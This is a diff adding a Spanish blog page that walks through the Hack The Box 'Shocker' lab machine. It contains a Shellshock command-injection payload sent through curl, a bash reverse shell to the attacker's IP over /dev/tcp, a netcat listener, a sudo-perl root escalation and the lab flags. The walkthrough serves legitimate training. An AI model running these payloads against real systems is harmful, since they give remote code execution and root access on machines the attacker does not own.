@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Shocker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="../img/catIcon.webp" type="image/x-icon" />
+    <link rel="alternate" type="application/atom+xml" title="ruflas Atom Feed" href="https://ruflas.dev/weblog/atom.xml" />
+    <meta name="description" content="Shocker Writeup HTB" />
+    <script src="shockerTranslate.js"></script>
+    <script>
+      function initTheme() {
+        var themeSwitcher = document.getElementById("checkbox");
+        var currentTheme = localStorage.getItem("theme");
+
+        if (!currentTheme) {
+          currentTheme = "whitestyles.css";
+          localStorage.setItem("theme", currentTheme);
+        }
+
+        document
+          .getElementById("theme-style")
+          .setAttribute("href", currentTheme);
+
+        themeSwitcher.checked = currentTheme === "darkstyles.css";
+      }
+
+      function toggleTheme() {
+        var themeSwitcher = document.getElementById("checkbox");
+        var theme = themeSwitcher.checked
+          ? "whitestyles.css"
+          : "darkstyles.css";
+        document.getElementById("theme-style").setAttribute("href", theme);
+        localStorage.setItem("theme", theme);
+      }
+
+      window.onload = function () {
+        initTheme();
+        var themeSwitcher = document.getElementById("checkbox");
+        themeSwitcher.addEventListener("change", toggleTheme);
+      }
+    </script>
+    <script defer src="https://stats.ruflas.dev/script.js" data-website-id="7aace55c-ceea-49f9-b041-38685370276a"></script>
+    <link
+      id="theme-style"
+      rel="stylesheet"
+      type="text/css"
+      href="whitestyles.css"
+    />
+  </head>
+  <body data-post-id="4">
+    <header>
+      <nav>
+        <ul class="nav-links">
+          <li><a id="navInicio" href="https://ruflas.dev">Inicio</a></li>
+          <li><a id="weblog" href="https://ruflas.dev/weblog/">Weblog</a></li>
+          <li><a id="now" href="https://ruflas.dev/now">Now</a></li>
+          <li>
+            <a href="https://ruflas.dev/weblog/atom.xml">
+              <img src="../img/rss.svg" alt="RSS Feed" class="rss-icon" />
+            </a>
+          </li>
+        </ul>
+        <div class="theme-switch-wrapper">
+          <label class="theme-switch" for="checkbox">
+            <input type="checkbox" id="checkbox" />
+            <div class="slider round" onclick="toggleTheme()"></div>
+          </label>
+        </div>
+      </nav>
+    </header>
+    <main>
+      <div class="post">
+        <h1 id="postTitle">Shocker Writeup</h1>
+        <h2 id="postDate" class="date">Publicado el 14 de noviembre de 2023</h2>
+        <h3 id="authorInfo" class="info">
+          Challenge creado por <a href="https://app.hackthebox.com/users/2984">mrb3n</a>
+        </h3>
+        <p id="linuxMachineIntro">
+          Esta máquina Linux se basa en una explotación del Shellshock exploit el cual fue divulgado por primera vez el 24 de septiembre de 2014.
+        </p>
+        <p id="portScanning">
+          Primero realizamos un escaneo de puertos a la máquina para ver qué servicios puede tener activos:
+        </p>
+        <code
+          >┌─[✗]─[ruflas@parrot]─[~] <br />└──╼ $sudo nmap -sC -sV 10.10.10.56
+          <br />Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-13 23:53 CET
+          <br />Nmap scan report for 10.10.10.56 <br />
+          Host is up (0.044s latency). <br />Not shown: 998 closed tcp ports
+          (reset) <br />PORT STATE SERVICE VERSION <br />80/tcp open http Apache
+          httpd 2.4.18 ((Ubuntu)) <br />|_http-title: Site doesn't have a title
+          (text/html). <br />|_http-server-header: Apache/2.4.18 (Ubuntu)
+          <br />2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux;
+          protocol 2.0) <br />| ssh-hostkey: <br />| 2048
+          c4f8ade8f80477decf150d630a187e49 (RSA) <br />| 256
+          228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) <br />|_ 256
+          e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) <br />
+          Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+          <br />
+          <br />
+          Service detection performed. Please report any incorrect results at
+          https://nmap.org/submit/ . <br />
+          Nmap done: 1 IP address (1 host up) scanned in 8.93 seconds
+        </code>
+        <p id="portsOpen">
+          Podemos observar que tiene el puerto 80 (Servicio Apache) y el puerto 2222 (SSH) abiertos.
+        </p>
+        <p id="webServiceAccess">Probamos a acceder al servicio web:</p>
+        <div class="postimg" id="webServiceScreenshot">
+          <a href="../img/shckr1.webp">
+            <img src="../img/shckr1.webp" alt="Página web de Shocker" />
+          </a>
+        </div>
+        <p id="checkCode">Miramos el código del mismo:</p>
+        <div class="postimg" id="webServiceCodeScreenshot">
+          <a href="../img/shckr2.webp">
+            <img src="../img/shckr2.webp" alt="Código página web de Shocker" />
+          </a>
+        </div>
+        <p id="webServiceNotInteresting">Podemos observar que el servicio web no tiene nada interesante.</p>
+        <p id="gobusterDirb">
+          Probamos a ejecutar gobuster dirb para enumerar posibles ficheros o directorios ocultos:
+        </p>
+        <code
+          >┌─[ruflas@parrot]─[~] <br />└──╼ $gobuster dir -u http://10.10.10.56
+          -w /usr/share/wordlists/dirb/big.txt
+          <br />===============================================================
+          <br />Gobuster v3.1.0 <br />by OJ Reeves (@TheColonial) & Christian
+          Mehlmauer (@firefart)
+          <br />===============================================================
+          <br />[+] Url: http://10.10.10.56 <br />[+] Method: GET <br />[+]
+          Threads: 10 <br />[+] Wordlist: /usr/share/wordlists/dirb/big.txt
+          <br />[+] Negative Status codes: 404 <br />[+] User Agent:
+          gobuster/3.1.0 <br />[+] Timeout: 10s
+          <br />===============================================================
+          <br />2023/11/14 00:00:37 Starting gobuster in directory enumeration
+          mode
+          <br />===============================================================
+          <br />/.htaccess (Status: 403) [Size: 295] <br />/.htpasswd (Status:
+          403) [Size: 295] <br />/cgi-bin/ (Status: 403) [Size: 294]
+          <br />/server-status (Status: 403) [Size: 299]
+          <br />
+          <br />===============================================================
+          <br />2023/11/14 00:01:51 Finished
+          <br />===============================================================
+        </code>
+        <p id="cgiBinInteresting">
+          Podemos observar que tenemos un directorio cgi-bin el cual podría ser interesante.
+        </p>
+        <p id="searchFilesDirectory">Probamos a buscar ficheros en el directorio:</p>
+        <code
+          >┌─[✗]─[ruflas@parrot]─[~] <br />
+          └──╼ $gobuster dir -u http://10.10.10.56/cgi-bin/ -x
+          .php,.html,.txt,.sh -w /usr/share/wordlists/dirb/common.txt <br />
+          =============================================================== <br />
+          Gobuster v3.1.0 <br />
+          by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) <br />
+          =============================================================== <br />
+          [+] Url: http://10.10.10.56/cgi-bin/ <br />
+          [+] Method: GET <br />
+          [+] Threads: 10 <br />
+          [+] Wordlist: /usr/share/wordlists/dirb/common.txt <br />
+          [+] Negative Status codes: 404 <br />
+          [+] User Agent: gobuster/3.1.0 <br />
+          [+] Extensions: sh,php,html,txt <br />
+          [+] Timeout: 10s <br />
+          =============================================================== <br />
+          2023/11/14 00:07:48 Starting gobuster in directory enumeration mode
+          <br />
+          =============================================================== <br />
+          [FICHEROS QUE NO NOS INTERESAN] <br />
+          /user.sh (Status: 200) [Size: 119]
+          <br />
+          <br />
+          =============================================================== <br />
+          2023/11/14 00:09:14 Finished <br />
+          ===============================================================
+        </code>
+        <p id="checkUserShFile">Vamos a mirar qué contiene el archivo "user.sh":</p>
+        <code
+          >┌─[ruflas@parrot]─[~/Downloads] <br />
+          └──╼ $cat user.sh <br />Content-Type: text/plain
+          <br />
+          <br />Just an uptime test script
+          <br />
+          <br />
+          17:40:53 up 9 min, 0 users, load average: 0.00, 0.00, 0.00
+        </code>
+        <p id="userShFileContent">
+          Podemos observar que el archivo contiene un script de bash que nos muestra el uptime del sistema.
+        </p>
+        <p id="shellshockExploitAttempt">Podemos probar a explotar la máquina mediante Shellshock</p>
+        <p id="googleForExploits">Para ello buscando en Google encontraremos ejemplos de exploits:</p>
+        <code
+          >curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo
+          ; /usr/bin/id" http://{IP}/cgi-bin/test/test.cgi</code
+        >
+        <p id="exploitAdaptation">Adaptado a nuestro uso sería:</p>
+        <code
+          >curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo
+          ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh</code
+        >
+        <p id="exploitOutput">Cuya salida será:</p>
+        <code
+          >uid=1000(shelly) gid=1000(shelly)
+          groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</code
+        >
+        <p id="executingUser">
+          Podemos observar que el usuario que está ejecutando el script es "shelly".
+        </p>
+        <p id="reverseShellAttempt">Probamos a ejecutar una reverse shell:</p>
+        <code
+          >curl -H 'User-Agent: () { :; }; /bin/bash -i >&
+          /dev/tcp/10.10.14.15/1234 0>&1'
+          http://10.10.10.56/cgi-bin/user.sh</code
+        >
+        <p id="openNetcat">Y en nuestra máquina abrimos un netcat en el puerto 1234:</p>
+        <code
+          >┌─[ruflas@parrot]─[~] <br />
+          └──╼ $nc -lvnp 1234 <br />
+          listening on [any] 1234 ...
+        </code>
+        <p id="obtainShell">Y obtenemos una shell:</p>
+        <code
+          >┌─[✗]─[ruflas@parrot]─[~] <br />└──╼ $sudo nc -lvnp 1234
+          <br />listening on [any] 1234 ... <br />connect to [10.10.14.15] from
+          (UNKNOWN) [10.10.10.56] 52110 <br />bash: no job control in this shell
+          <br />shelly@Shocker:/usr/lib/cgi-bin$ whoami <br />whoami
+          <br />shelly <br />shelly@Shocker:/usr/lib/cgi-bin$
+        </code>
+        <p id="userFlagAcquisition">Una vez dentro de la máquina podemos obtener la flag de usuario:</p>
+        <code
+          >shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt <br />cat
+          /home/shelly/user.txt <br />
+          <div class="spoiler">796d1cd815b6135827ffca2198eb162a</div>
+        </code>
+        <p id="sudoLCheck">
+          Ahora ejecutamos "sudo -l" para ver si tenemos privilegios en algún archivo sin contraseña para escalar privilegios:
+        </p>
+        <code
+        >shelly@Shocker:/usr/lib/cgi-bin$ sudo -l <br />sudo -l <br />
+        Matching Defaults entries for shelly on Shocker: <br />
+        env_reset, mail_badpass,
+        <br />secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+        <br />
+        <br />User shelly may run the following commands on Shocker:
+        <br />(root) NOPASSWD: /usr/bin/perl
+        </code>
+        <p id="shellySudoPermissions">
+          Podemos observar que el usuario shelly puede ejecutar perl como root sin contraseña.
+        </p>
+        <p id="searchSudoExploit">Buscamos en Google la web GTFOBINS y buscamos un exploit de sudo para perl:</p>
+        <p id="perlSudoExploit">
+          El exploit sería este: <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">perl sudo priv esc</a>
+        </p>
+        <p id="executeExploit">
+          Lo ejecutamos y veremos cómo fácilmente hemos escalado privilegios como root en la máquina:
+        </p>
+        <code
+          >shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
+          <br />sudo perl -e 'exec "/bin/sh";' <br />whoami <br />root
+        </code>
+        <p id="rootFlagAcquisition">Y ya tenemos la flag de root:</p>
+        <code
+          >cat /root/root.txt <br />
+          <div class="spoiler">8e9e6e5aba5038446db85404fdc65ca2</div>
+        </code>
+        <p id="machineCompletion">Y ya hemos terminado la máquina Shocker ✅.</p>
+        <div class="postimg" id="machineCompletedScreenshot">
+          <a href="https://www.hackthebox.com/achievement/machine/403595/108">
+            <img src="../img/shckr3.webp" alt="Owned Shocker✅" />
+          </a>
+        </div>
+      </div>
+    </main>
+    <section id="commentsSection">
+      <h2 id="commentsSectionTitle">Comentarios</h2>
+  
+      <form id="commentForm" onsubmit="postComment(event)">
+          <input type="text" id="nameInput" placeholder="Nombre" required />
+          <input type="text" id="websiteInput" placeholder="Sitio web" />
+          <textarea id="commentInput" placeholder="Comentario" required></textarea>
+          <button type="submit" id="submitButtonText">Publicar</button>
+      </form>
+  
+      <div id="commentsContainer"></div>
+  </section>
+  
+    <footer>
+      <p id="footerText">
+        © 2022-2025 ruflas | licensed under <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">CC BY-SA</a> 😽
+      </p>
+    </footer>
+    <script src="code.js"></script>
+  </body>
+</html>
